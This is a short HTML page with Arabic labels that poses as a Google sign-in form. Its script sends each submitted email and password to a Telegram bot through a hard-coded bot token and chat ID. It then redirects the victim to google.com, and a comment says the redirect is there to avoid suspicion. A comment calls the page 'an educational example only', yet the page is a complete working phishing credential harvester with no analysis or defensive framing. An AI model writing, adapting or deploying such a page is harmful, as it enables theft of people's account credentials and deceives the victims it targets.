<!DOCTYPE html>
<html>
<head>
    <title>صفحة تسجيل</title>
</head>
<body>
    <form id="loginForm">
        <input type="email" id="email" placeholder="بريد جوجل">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button type="submit">تسجيل الدخول</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // إرسال البيانات إلى بوت تلجرام (مثال تعليمي فقط)
            const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
            const chatId = '7327464581';
            const message = `بيانات تسجيل دخول جديدة:\nالبريد: ${email}\nكلمة المرور: ${password}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
            
            // إعادة توجيه المستخدم لتجنب الشك
            window.location.href = 'https://google.com';
        });
    </script>
</body>
</html>
